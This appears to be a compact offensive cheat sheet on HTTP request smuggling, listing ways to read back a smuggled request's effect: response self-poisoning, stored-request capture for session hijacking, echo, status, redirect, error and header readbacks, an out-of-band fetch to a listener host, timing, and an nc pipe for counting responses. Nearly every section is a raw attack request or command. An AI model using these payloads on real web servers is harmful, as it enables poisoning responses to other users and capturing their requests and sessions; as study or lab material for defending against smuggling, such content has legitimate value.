# Readback deep — every channel the smuggle's output reaches

## The self-poison — the primary channel

```text
POST / [desync: GET /marker] → GET / → the GET's response is /marker
```

Your next request's response IS the smuggle's — `response-poisoning.md`.

## The stored readback — `POST /store` + `GET /store/last`

```text
POST /store HTTP/1.1
Content-Length: 400

x=
```

The next request inside `x=` → stored → read it — `session-hijack.md`.

## The echo readback — `GET /search?q=X`

```text
GET /search?q=MARKER HTTP/1.1
```

smuggled → the response echoes `MARKER` — `smuggle-readback.md`.

## The status readback — the smuggle's status lands

```text
GET /admin HTTP/1.1
```

smuggled → the next response's status is `/admin`'s — `smuggle-readback.md`.

## The Location readback — the smuggle's `Location:`

```text
GET /redirect?to=/marker HTTP/1.1
```

smuggled → the `Location: /marker` lands — `smuggle-readback.md`.

## The error-body readback — the smuggle's error

```text
GET /invalid-path HTTP/1.1
```

smuggled → the 404-body names the path — `smuggle-readback.md`.

## The OOB readback — the smuggle's URL-fetch

```text
GET /?url=http://oob.t/marker HTTP/1.1
```

smuggled → `oob_listener` captures it — `blind-smuggle.md`.

## The header readback — `X-Debug: marker`

```text
GET / HTTP/1.1
X-Debug: marker
```

smuggled → the next response's debug-output names `X-Debug` —
`smuggle-readback.md`.

## The body-length readback — the `Content-Length` delta

```text
GET /flag HTTP/1.1
```

smuggled → the next response's `Content-Length` differs — the
length-readback.

## The timing readback — the delay

```text
GET /slow HTTP/1.1
```

smuggled → the next response is slow — weakest — `inconclusive`.

## The deferred readback — the async job

```text
store the smuggle → the job runs → the job's log
```

`webhook-deferred.md`.

## The socket-accounting — the response-count

```bash
printf 'POST / [desync] GET / HTTP/1.1\r\n\r\n' | nc t 80
```

Count the status lines — `detection-oracle.md`.

## The cross-victim readback — the victim's response poisons you

On a shared queue a victim's smuggle-poison lands on YOUR next request —
the cross-victim readback — `response-poisoning.md`.
